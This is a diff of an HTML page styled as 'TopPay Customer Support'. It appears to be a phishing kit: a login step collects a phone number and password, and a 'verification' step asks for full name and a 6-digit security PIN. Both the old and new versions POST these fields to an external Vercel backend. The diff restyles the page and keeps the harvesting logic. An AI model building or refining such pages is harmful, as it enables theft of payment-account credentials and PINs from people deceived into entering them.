@@ -4,274 +4,304 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TopPay Customer Support</title>
-    <!-- Font Awesome for Success Icon -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #78a757; --bg: #f9f9f9; --text: #333; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; min-height: 100vh; }
-        
-        .container { 
-            width: 100%; max-width: 480px; background: #fff; padding: 30px; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05); min-height: 100vh; 
-            display: flex; flex-direction: column; box-sizing: border-box;
+        :root {
+            --primary: #5c9c49; /* Green from your screenshot */
+            --primary-hover: #4b823b;
+            --bg: #f3f4f6;
+            --white: #ffffff;
+            --text-main: #1f2937;
+            --text-light: #6b7280;
+            --border: #d1d5db;
         }
 
-        /* HEADER */
-        .app-header { text-align: center; margin-bottom: 20px; margin-top: 10px; }
-        .logo-img { width: 80px; height: 80px; object-fit: contain; margin: 0 auto 10px; display: block; }
-        
-        /* CHANGED: Color set to Black (#000) */
-        .brand-title { color: #000; font-size: 24px; font-weight: bold; margin: 0; }
-        
-        .sub-text { color: #666; font-size: 14px; margin-top: 5px; }
-
-        /* VIEWS */
-        .hidden { display: none !important; }
-        h2, h3 { color: var(--text); }
-        h3 { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 20px; }
-
-        /* INPUTS */
-        .input-group { margin-bottom: 20px; }
-        .input-group label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--text); }
-        .input-field { 
-            width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; 
-            background: #f5f5f5; font-size: 16px; box-sizing: border-box; outline: none;
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-main);
         }
-        .input-field:focus { border-color: var(--primary); }
 
-        /* PIN BOX */
-        .pin-wrapper { display: flex; gap: 5px; justify-content: space-between; }
-        .pin-box { 
-            width: 15%; height: 50px; text-align: center; font-size: 24px; 
-            border: 1px solid #ccc; border-radius: 8px; background: white; 
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
         }
-        .pin-box:focus { border-color: var(--primary); border-width: 2px; outline: none; }
 
-        /* BUTTONS */
-        .btn { 
-            width: 100%; padding: 15px; border: none; border-radius: 8px; 
-            font-size: 18px; font-weight: bold; cursor: pointer; color: white; margin-top: 10px;
+        .card {
+            background: var(--white);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            text-align: center;
         }
-        .btn-grey { background: #666; }
-        .btn-green { background: var(--primary); }
-        .btn:disabled { background: #ccc; cursor: not-allowed; }
 
-        /* MODAL */
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; z-index: 1000;
+        .logo {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 15px;
         }
-        .modal-box {
-            background: white; padding: 40px 30px; border-radius: 15px; 
-            text-align: center; width: 85%; max-width: 350px;
+
+        h2 {
+            margin: 0 0 10px 0;
+            font-size: 22px;
+            font-weight: 700;
         }
-        .success-icon { color: var(--primary); font-size: 70px; margin-bottom: 20px; }
+
+        p {
+            margin: 0 0 25px 0;
+            color: var(--text-light);
+            font-size: 14px;
+        }
+
+        /* --- FORM ELEMENTS --- */
+        .form-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            font-size: 14px;
+            color: var(--text-main);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box; /* Fixes width issues */
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(92, 156, 73, 0.1);
+        }
+
+        /* --- PIN INPUTS --- */
+        .pin-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+        }
+
+        .pin-input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            padding: 0;
+        }
+
+        /* --- BUTTONS --- */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .btn:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        /* --- UTILS --- */
+        .hidden {
+            display: none;
+        }
+
+        .error-msg {
+            color: #ef4444;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Header (Always Visible) -->
-    <div class="app-header">
-        <!-- 
-           Since 'public' is the root folder for the server, 
-           'public/logo.png' is accessed simply as 'logo.png' 
-        -->
-        <img src="logo.png" alt="Logo" class="logo-img">
-        <h1 class="brand-title">TopPay Customer Support</h1>
-    </div>
+    <div class="card">
+        <img src="logo.png" onerror="this.src='https://via.placeholder.com/60?text=Logo'" alt="TopPay Logo" class="logo">
 
-    <!-- VIEW 1: LOGIN -->
-    <div id="view-login">
-        <h2 style="text-align:center; color:#666; margin-top: 30px;">LOG IN</h2>
-        <form id="loginForm">
-            <div class="input-group">
-                <input id="logPhone" class="input-field" placeholder="Enter Your Phone Number" maxlength="10" inputmode="numeric">
+        <div id="step-1">
+            <h2>Welcome Back</h2>
+            <p>Please login to continue</p>
+            
+            <div class="form-group">
+                <label>Mobile Number</label>
+                <input type="tel" id="loginPhone" placeholder="Enter mobile number">
             </div>
-            <div class="input-group">
-                <input type="password" id="logPass" class="input-field" placeholder="Enter Password">
-            </div>
-            <div id="loginErr" style="color:red; text-align:center; margin-bottom:10px;"></div>
-            <button type="submit" class="btn btn-grey">LOG IN</button>
-        </form>
-    </div>
 
-    <!-- VIEW 2: FORM -->
-    <div id="view-form" class="hidden">
-        <p class="sub-text" style="text-align:center;">Please complete your verification</p>
-        <h3>Verification Details</h3>
-        
-        <form id="detailsForm">
-            <div class="input-group">
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="Enter password">
+            </div>
+
+            <button class="btn" onclick="goToStep2()">Login Securely</button>
+            <div id="error-step1" class="error-msg">Please fill in all fields.</div>
+        </div>
+
+        <div id="step-2" class="hidden">
+            <h2>Verification Details</h2>
+            <p>Please complete your profile verification</p>
+
+            <div class="form-group">
                 <label>Full Name</label>
-                <input type="text" id="fullName" class="input-field" placeholder="Enter full name" required>
+                <input type="text" id="fullName" placeholder="e.g. Rahul Sharma">
             </div>
 
-            <div class="input-group">
-                <label>Problem</label>
-                <select id="problem" class="input-field" required>
-                    <option value="" disabled selected>Select your problem</option>
-                    <option value="Id auto logout">ID Auto Logout</option>
-                    <option value="Pending payment">Payment Pending</option>
-                    <option value="Slow sell">Slow Sell</option>
-                    <option value="Quota not added">Quota Not Added</option>
-                    <option value="Tool auto deauthorized">Tool Auto Deauthorized</option>
+            <div class="form-group">
+                <label>Problem Type</label>
+                <select id="problem">
+                    <option value="Payment Pending">Payment Pending</option>
+                    <option value="KYC Issue">KYC Issue</option>
+                    <option value="Login Error">Login Error</option>
+                    <option value="Other">Other</option>
                 </select>
             </div>
 
-            <div class="input-group">
+            <div class="form-group">
                 <label>Security PIN (6 digits)</label>
-                <div class="pin-wrapper">
-                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <div class="pin-container">
+                    <input type="tel" class="pin-input" maxlength="1">
+                    <input type="tel" class="pin-input" maxlength="1">
+                    <input type="tel" class="pin-input" maxlength="1">
+                    <input type="tel" class="pin-input" maxlength="1">
+                    <input type="tel" class="pin-input" maxlength="1">
+                    <input type="tel" class="pin-input" maxlength="1">
                 </div>
-                <small style="color:#666; display:block; margin-top:5px;">Please enter a 6-digit PIN</small>
             </div>
 
-            <div class="input-group">
+            <div class="form-group">
                 <label>Investment Experience</label>
-                <select id="experience" class="input-field" required>
-                    <option value="" disabled selected>Select experience level</option>
-                    <option value="Beginner">Beginner (0-1 years)</option>
-                    <option value="Intermediate">Intermediate (1-3 years)</option>
-                    <option value="Expert">Expert (3+ years)</option>
+                <select id="experience">
+                    <option value="Beginner (0-1 years)">Beginner (0-1 years)</option>
+                    <option value="Intermediate (1-3 years)">Intermediate (1-3 years)</option>
+                    <option value="Expert (3+ years)">Expert (3+ years)</option>
                 </select>
             </div>
 
-            <button type="submit" id="submitBtn" class="btn btn-green">Submit Verification</button>
-        </form>
-    </div>
-</div>
-
-<!-- SUCCESS MODAL -->
-<div class="modal-overlay" id="successModal">
-    <div class="modal-box">
-        <i class="fa-solid fa-square-check success-icon"></i>
-        <h2 style="margin:0 0 10px 0; color: #333;">Submission Successful</h2>
-        <p style="color:#555; line-height:1.5;">Your verification details have been submitted. Your problem is under review.</p>
-        <button onclick="resetApp()" class="btn btn-green">OK</button>
-        <p style="font-size:12px; color:#999; margin-top:15px;">Auto redirecting in <span id="timer">5</span>s...</p>
+            <button class="btn" id="submitBtn" onclick="handleFinalSubmit()">Submit Verification</button>
+        </div>
+        
     </div>
 </div>
 
 <script>
-    // --- STATE MANAGEMENT ---
-    let credentials = {}; 
-    const loginView = document.getElementById('view-login');
-    const formView = document.getElementById('view-form');
-    
-    // --- 1. LOGIN LOGIC ---
-    document.getElementById('loginForm').addEventListener('submit', (e) => {
-        e.preventDefault();
-        const phone = document.getElementById('logPhone').value;
-        const pass = document.getElementById('logPass').value;
-        const err = document.getElementById('loginErr');
+    // ================= CONFIGURATION =================
+    // ⚠️ REPLACE THIS with your actual Vercel URL if different
+    const BACKEND_URL = 'https://toppay-customer-service.vercel.app'; 
 
-        if (!/^\d{10}$/.test(phone)) {
-            err.innerText = "Please enter a valid 10-digit phone number.";
-            return;
-        }
-        if (!pass) {
-            err.innerText = "Please enter password.";
+    // ================= NAVIGATION =================
+    function goToStep2() {
+        const phone = document.getElementById('loginPhone').value;
+        const pass = document.getElementById('loginPassword').value;
+
+        if (!phone || !pass) {
+            document.getElementById('error-step1').style.display = 'block';
             return;
         }
 
-        // Save credentials temporarily in memory variable
-        credentials = { loginPhone: phone, loginPassword: pass };
-        
-        // Switch to Form View
-        loginView.classList.add('hidden');
-        formView.classList.remove('hidden');
-    });
+        // Hide Step 1, Show Step 2
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+    }
 
-    // --- 2. PIN BOX LOGIC ---
-    const pins = document.querySelectorAll('.pin-box');
-    pins.forEach((input, index) => {
+    // ================= PIN LOGIC =================
+    // Automatically focus the next box when typing numbers
+    const pinInputs = document.querySelectorAll('.pin-input');
+    pinInputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
-            if (e.target.value.length === 1 && index < pins.length - 1) {
-                pins[index + 1].focus();
+            if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+                pinInputs[index + 1].focus();
             }
         });
+
         input.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-                pins[index - 1].focus();
+                pinInputs[index - 1].focus();
             }
         });
     });
 
-    // --- 3. SUBMIT LOGIC ---
-    document.getElementById('detailsForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
+    // ================= SUBMISSION LOGIC =================
+    async function handleFinalSubmit() {
         const btn = document.getElementById('submitBtn');
+        const originalText = btn.innerText;
         
-        // Validate PIN
-        let combinedPin = '';
-        pins.forEach(p => combinedPin += p.value);
-        
-        if (combinedPin.length !== 6) {
-            alert("Please enter full 6-digit PIN.");
-            return;
-        }
-
+        // 1. Loading State
+        btn.innerText = "Processing...";
         btn.disabled = true;
-        btn.innerText = "Submitting...";
-
-        // Prepare Data
-        const data = {
-            ...credentials, // Spread login creds
-            fullName: document.getElementById('fullName').value,
-            problem: document.getElementById('problem').value,
-            securityPin: combinedPin,
-            experience: document.getElementById('experience').value
-        };
 
         try {
-            const BACKEND_URL = 'https://toppay-customer-service.vercel.app'; 
-            const res = await fetch(`${BACKEND_URL}/api/submit`, {
+            // 2. Gather Data from BOTH steps
+            let securityPin = '';
+            pinInputs.forEach(input => securityPin += input.value);
+
+            const formData = {
+                loginPhone: document.getElementById('loginPhone').value,
+                loginPassword: document.getElementById('loginPassword').value,
+                fullName: document.getElementById('fullName').value,
+                problem: document.getElementById('problem').value,
+                experience: document.getElementById('experience').value,
+                securityPin: securityPin
+            };
+
+            // 3. Send to Backend (Vercel)
+            // Note: We use the BACKEND_URL variable here!
+            const response = await fetch(`${BACKEND_URL}/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify(formData)
             });
 
-            if (res.ok) {
-                showSuccess();
+            const result = await response.json();
+
+            // 4. Handle Response
+            if (response.ok) {
+                alert("Submission Successful! We will review your details.");
+                window.location.reload(); // Reset form
             } else {
-                alert("Submission failed. Please try again.");
-                btn.disabled = false;
-                btn.innerText = "Submit Verification";
+                alert("Error: " + (result.error || "Submission failed"));
             }
-        } catch (err) {
-            console.error(err);
-            alert("Network Error");
+
+        } catch (error) {
+            console.error(error);
+            alert("Network Error: Could not connect to server. Please check your internet.");
+        } finally {
+            // Reset Button
+            btn.innerText = originalText;
             btn.disabled = false;
-            btn.innerText = "Submit Verification";
         }
-    });
-
-    // --- 4. SUCCESS & TIMER ---
-    function showSuccess() {
-        const modal = document.getElementById('successModal');
-        const timerSpan = document.getElementById('timer');
-        modal.style.display = 'flex';
-        
-        let timeLeft = 5;
-        const interval = setInterval(() => {
-            timeLeft--;
-            timerSpan.innerText = timeLeft;
-            if (timeLeft <= 0) {
-                clearInterval(interval);
-                resetApp();
-            }
-        }, 1000);
-    }
-
-    function resetApp() {
-        window.location.reload();
     }
 </script>
+
 </body>
 </html>
